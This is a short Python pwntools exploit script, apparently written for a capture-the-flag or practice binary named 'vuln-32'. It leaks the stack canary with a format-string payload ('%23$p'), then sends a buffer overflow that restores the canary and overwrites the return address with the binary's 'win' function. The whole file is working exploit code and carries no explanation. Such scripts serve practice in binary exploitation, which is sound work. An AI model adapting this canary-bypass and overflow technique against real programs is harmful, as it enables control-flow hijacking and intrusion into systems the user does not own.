from pwn import *

exe='./vuln-32'
elf=context.binary=ELF(exe)
p=process(exe)
log.info(p.clean())

payload_canary=b'%23$p'

p.sendline(payload_canary)
canary=int(p.recvline(),16)

log.success(f"canary found: {hex(canary)}")

offset_canary=64
offset_ret=80
win=elf.sym['win']


payload=flat(
    b'A'*offset_canary,
    canary,
    b'B'*(offset_ret-(offset_canary+4)),
    win
)

p.clean()
p.sendline(payload)
print(p.clean().decode('latin-1'))